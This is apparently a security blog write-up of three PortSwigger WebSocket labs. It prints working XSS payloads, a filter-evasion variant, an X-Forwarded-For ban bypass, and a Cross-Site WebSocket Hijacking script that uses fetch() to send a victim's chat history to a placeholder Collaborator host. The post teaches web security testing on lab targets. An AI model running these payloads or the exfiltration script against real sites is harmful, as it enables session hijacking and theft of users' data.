---
layout: default
title: "Mastering WebSocket Attacks: A Deep Dive into PortSwigger Labs (Part 2)"
date: 2026-01-07
categories: [Web Security, Exploitation, WebSockets]
toc: true
---

# ⚔️ Exploiting WebSockets: From Theory to Practice

In Part 1, we explored the unique persistent architecture of WebSockets and the "blind spots" it creates for traditional security tools.

Now, we move to **exploitation**. This guide breaks down three distinct scenarios from the PortSwigger Web Security Academy, demonstrating how to bypass client-side filters, hijack sessions via Cross-Site WebSocket Hijacking (CSWSH), and spoof IP addresses to evade blacklists.

---

## 🧪 LAB 1: Manipulating WebSocket Messages to Exploit Vulnerabilities

### 🧐 How the Vulnerability Exists
This lab demonstrates a classic **Client-Side Filtering** failure.

1.  **The Flaw:** The application sanitizes user input (e.g., encoding `<` to `&lt;`) using JavaScript running in the browser *before* sending it to the WebSocket server.
2.  **The Trust:** The server receives the message and assumes it is safe because the client "promised" to clean it. It then reflects this message to other users (like a support agent) without further encoding.
3.  **The Bypass:** By intercepting the traffic *after* the browser has sent it but *before* it reaches the server, we can replace the sanitized data with malicious HTML.

### ⚠️ Preconditions
Input validation is performed on the client-side.
The attacker has a tool (Burp Suite) to intercept WebSocket frames.

### 🚨 Exploitation Steps

1.  **Reconnaissance (Identify the Filter):**
    Open the "Live chat" and send a test message containing special characters: `<test>`.
    Go to **Proxy > WebSockets history** in Burp Suite.
    Observe the outgoing message. If you see `&lt;test&gt;`, the browser is doing the work. This confirms the vulnerability.

2.  **Interception & Modification:**
    Turn **Intercept On** in Burp.
    Type a benign message (e.g., "test") in the chat and hit Send.
    The request will pause in Burp. Locate the WebSocket frame.
    Replace the content with an XSS payload:
    ```
    <img src=1 onerror='alert(1)'>
    ```
    **Forward** the modified frame.

    ![image](/images/Pasted%20image%2020260111165251.png)

3.  **Verification:**
    The server receives the raw HTML because you bypassed the browser's filter.
    The payload reflects in your chat window (and the victim's), executing the JavaScript alert.

**IMPACT:** Stored XSS leading to session hijacking of support staff.

---

## 🧪 LAB 2: Cross-Site WebSocket Hijacking (CSWSH)

### 🧐 How the Vulnerability Exists
This is a **CSRF** vulnerability that targets the WebSocket handshake to establish a persistent, two-way connection.

1.  **Implicit Authentication:** The WebSocket handshake (`GET /chat`) relies solely on session cookies for authentication.
2.  **Missing Origin Check:** The server fails to validate the `Origin` header. It accepts connections from *any* domain (e.g., `attacker-site.com`) as long as valid cookies are present.
3.  **No SOP:** WebSockets do not strictly enforce the Same-Origin Policy. An attacker can force a victim's browser to open a socket to the vulnerable server.

### ⚠️ Preconditions
Authentication relies on cookies (not tokens in headers).
No unpredictable CSRF tokens in the handshake URL.
`Origin` header is not validated.

### 🚨 Exploitation Steps

1.  **Reconnaissance:**
    Reload the chat page. In **Proxy > WebSockets history**, notice the client sends a `"READY"` message, and the server responds with chat history.
    In **HTTP history**, check the handshake request. Confirm there are **no CSRF tokens** and that authentication is cookie-based.

2.  **Crafting the Exploit:**
    You need a script hosted on your exploit server that:
        1.  Connects to the target WebSocket (`wss://...`).
        2.  Sends the "READY" trigger.
        3.  Exfiltrates the response to your Collaborator.
    Use the following payload:

    ```
    <script>
        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
        
        ws.onopen = function() {
            ws.send("READY");
        };
        
        ws.onmessage = function(event) {
            fetch('[https://YOUR-COLLABORATOR-ID.oastify.com](https://YOUR-COLLABORATOR-ID.oastify.com)', {
                method: 'POST',
                mode: 'no-cors',
                body: event.data
            });
        };
    </script>
    ```
    **Why this works:** When the victim visits this script, their browser initiates the connection using *their* cookies. The server accepts it, sends the history to the "attacker's" socket instance running in the victim's browser, which then forwards it to the attacker.

3.  **Execution:**
    Host the script on the **Exploit Server** and deliver it to the victim.
    Check your **Burp Collaborator** interactions.
    You will receive the JSON chat history containing the victim's password.

    ![image](/images/Pasted%20image%2020260111174536.png)

    ![image](/images/Pasted%20image%2020260111174528.png)

**IMPACT:** Full account compromise via data exfiltration.

---

## 🧪 LAB 3: Manipulating the WebSocket Handshake to Exploit Vulnerabilities

### 🧐 How the Vulnerability Exists
This lab combines **IP Blacklisting** evasion with **XSS** via WebSocket message obfuscation.

1.  **The Handshake Flaw:** The server uses the HTTP handshake to apply IP-based security bans. However, it trusts the `X-Forwarded-For` header, allowing attackers to spoof their IP.
2.  **The Logic Gap:** While the handshake has strict filters, the internal WebSocket message parser is more lenient (or inconsistent), allowing obfuscated payloads that the WAF would block.

### ⚠️ Preconditions
The server trusts `X-Forwarded-For`.
The WAF/Filter logic is case-sensitive or rigid.

### 🚨 Exploitation Steps

1.  **Trigger the Ban:**
    Send a standard XSS payload: `<img src=1 onerror='alert(1)'>`.
    **Observe:** The connection drops immediately. Attempting to reconnect fails because your IP is now blacklisted.

2.  **Bypass the Ban (IP Spoofing):**
    In **Repeater**, go to the **Handshake** tab (the HTTP Upgrade request).
    Add the header: `X-Forwarded-For: 1.1.1.1`.
    Click **Connect**.
    **Result:** The server accepts the connection, believing you are a new user.

    ![image](/images/Pasted%20image%2020260111180956.png)

3.  **Bypass the Filter (Obfuscation):**
    Now that you are reconnected, send a payload designed to evade the signature that banned you.
    Use mixed case and backticks instead of quotes:
    ```
    <img src=1 oNeRrOr=alert`1`>
    ```
    **Send** the message.

4.  **Result:**
    The connection remains open (filter evaded).
    The XSS payload executes in the browser.

    ![image](/images/Pasted%20image%2020260111181004.png)

**IMPACT:** Persistent access despite security controls; execution of malicious scripts.

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **Client-Side Filtering** | Browser sends encoded entities (`&lt;`). | Intercept & replace with raw HTML (`<`). |
| **CSWSH** | Handshake uses cookies, no CSRF token. | Host script to open socket & exfiltrate `onmessage` data. |
| **IP Ban Evasion** | Connection drops & reconnects fail. | Add `X-Forwarded-For` to Handshake request. |
| **WAF Evasion** | Payload causes disconnect. | Use obfuscation (`oNeRrOr`, backticks) or encoding. |
